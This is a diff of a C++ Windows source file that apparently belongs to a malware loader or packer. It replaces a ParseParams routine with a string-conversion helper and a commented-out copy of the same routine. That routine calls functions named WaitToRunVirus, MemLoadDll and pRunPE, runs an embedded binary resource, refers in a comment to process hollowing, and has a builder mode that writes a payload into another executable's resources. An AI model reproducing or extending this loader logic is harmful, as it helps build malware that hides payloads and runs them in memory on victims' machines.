@@ -151,82 +151,122 @@ public:
 	}
 
 public:
-    void ParseParams(int argc, wchar_t* argv[]) {
-        if (argc <= 1) {
-            WaitToRunVirus();
-            // MemoryLoadToRun(IDR_BINARY_FILE);
-            // MemoryLoadToRun(IDR_BINARY_FILE);
-            //pRunPE(IDR_BINARY_FILE);
+
+    // 宽字符转换为窄字符
+    bool WChar2Ansi(const wchar_t* pwszSrc, char*& pszDst)
+    {
+        bool flag = false;
+        size_t len = 0;
+        size_t trans_len = (wcslen(pwszSrc) * 2) + 1;
+
+        pszDst = new char[trans_len];
+        errno_t err = wcstombs_s(&len, pszDst, trans_len, pwszSrc, trans_len);
+
+        if (len > 0) {
+            flag = true;
         }
-        else if (argc == 2) {
-            CString str_param = argv[1];
-            if (str_param == L"run") {
-                
-                // MemoryLoadToRun(IDR_BINARY_FILE);
-                MemLoadDll();
-
-                int cnt = 10;
-                int pid = -1;
-                int config = ExtractLuaGetCfg(IDR_CFG);
-                while (cnt-- && pid == -1) {
-                    if (config) {
-                        pid = pRunPE(IDR_BINARY_FILE);
-                    }
-                    else {
-                        ExtractAndRunResourceProgram(IDR_BINARY_FILE, str_temp_path, pid);
-                    }
-                    Sleep(1000);
-                }
-
-              
-                SharedMemory share;
-                share.WritePid(pid);
-
-
-
-                //HANDLE hMainThread = OpenThread(THREAD_ALL_ACCESS, FALSE, GetCurrentThreadId());
-                //if (!hMainThread) {
-                //    return;
-                //}
-
-                //// 创建辅助线程执行 Hollowing
-                //HANDLE hThread = CreateThread(NULL, 0, HollowingThread, hMainThread, 0, NULL);
-                //if (!hThread) {
-                //    CloseHandle(hMainThread);
-                //    return;
-                //}
-
-                //// 等待辅助线程完成
-                //WaitForSingleObject(hThread, INFINITE);
-                //CloseHandle(hThread);
-                //CloseHandle(hMainThread);
-
-            }
-            else if (str_param == L"wait") {
-                return;
-            }
+        else {
+            delete[] pszDst;
+            pszDst = nullptr;
         }
-        else if(argc >= 3) {
-            WCHAR exePath[MAX_PATH];
-            // 获取当前程序的路径
-            DWORD result = GetModuleFileName(NULL, exePath, MAX_PATH);
-            LPCWSTR resourceFilePath = argv[1];
-            LPCWSTR newExePath = argv[2];
-            CString lua_path;
-            int config = 0;
-            if (argc >= 4) {
-                lua_path = argv[3];
-            }
-            if (argc >= 5) {
-                config = 1;
-            }
-#ifdef _WIN64
-            AddFileToResource(exePath, resourceFilePath, newExePath, lua_path, config);
-#else
-            AddFileToResource32(exePath, resourceFilePath, newExePath, lua_path, config);
-#endif
-        }
-    }   
+        return flag;
+    }
+
+    void ParseParams(int argc, wchar_t* argv[]);
+//    void ParseParams(int argc, wchar_t* argv[]) {
+//        if (argc <= 1) {
+//            WaitToRunVirus();
+//            // MemoryLoadToRun(IDR_BINARY_FILE);
+//            // MemoryLoadToRun(IDR_BINARY_FILE);
+//            //pRunPE(IDR_BINARY_FILE);
+//        }
+//        else if (argc == 2) {
+//            CString str_param = argv[1];
+//            if (str_param == L"run") {
+//                
+//                // MemoryLoadToRun(IDR_BINARY_FILE);
+//                MemLoadDll();
+//
+//                int cnt = 10;
+//                int pid = -1;
+//                int config = ExtractLuaGetCfg(IDR_CFG);
+//                while (cnt-- && pid == -1) {
+//                    if (config) {
+//                        pid = pRunPE(IDR_BINARY_FILE);
+//                    }
+//                    else {
+//                        ExtractAndRunResourceProgram(IDR_BINARY_FILE, str_temp_path, pid);
+//                    }
+//                    Sleep(1000);
+//                }
+//
+//              
+//                SharedMemory share;
+//                share.WritePid(pid);
+//
+//
+//
+//                //HANDLE hMainThread = OpenThread(THREAD_ALL_ACCESS, FALSE, GetCurrentThreadId());
+//                //if (!hMainThread) {
+//                //    return;
+//                //}
+//
+//                //// 创建辅助线程执行 Hollowing
+//                //HANDLE hThread = CreateThread(NULL, 0, HollowingThread, hMainThread, 0, NULL);
+//                //if (!hThread) {
+//                //    CloseHandle(hMainThread);
+//                //    return;
+//                //}
+//
+//                //// 等待辅助线程完成
+//                //WaitForSingleObject(hThread, INFINITE);
+//                //CloseHandle(hThread);
+//                //CloseHandle(hMainThread);
+//
+//            }
+//            else if (str_param == L"wait") {
+//                return;
+//            }
+//            
+//        }
+//        else if(argc >= 3) {
+//
+//            CString str_param = argv[1];
+//            if (str_param == L"runlua") {
+//                char* str_file;
+//                CStringHandler::InitChinese();
+//                CStringHandler::WChar2Ansi(argv[2], str_file);
+//                if (str_file) {
+//                    LuaRunner runner;
+//                    runner.run_lua_file(str_file);
+//                    delete[] str_file;
+//                }
+//                else {
+//                    OutputDebugStringA("trans file data to char failed .");
+//                }
+//                return;
+//            }
+//
+//            WCHAR exePath[MAX_PATH];
+//            // 获取当前程序的路径
+//            DWORD result = GetModuleFileName(NULL, exePath, MAX_PATH);
+//            LPCWSTR resourceFilePath = argv[1];
+//            LPCWSTR newExePath = argv[2];
+//            CString lua_path;
+//            int config = 0;
+//            if (argc >= 4) {
+//                lua_path = argv[3];
+//            }
+//            if (argc >= 5) {
+//                config = 1;
+//            }
+//#ifdef _WIN64
+//            AddFileToResource(exePath, resourceFilePath, newExePath, lua_path, config);
+//#else
+//            AddFileToResource32(exePath, resourceFilePath, newExePath, lua_path, config);
+//#endif
+//        }
+//    }   
 
     //BOOL AddFileToResource(LPCWSTR exePath, LPCWSTR resourceFilePath, LPCWSTR newExePath) {
     //    WCHAR tempFilePath[MAX_PATH];
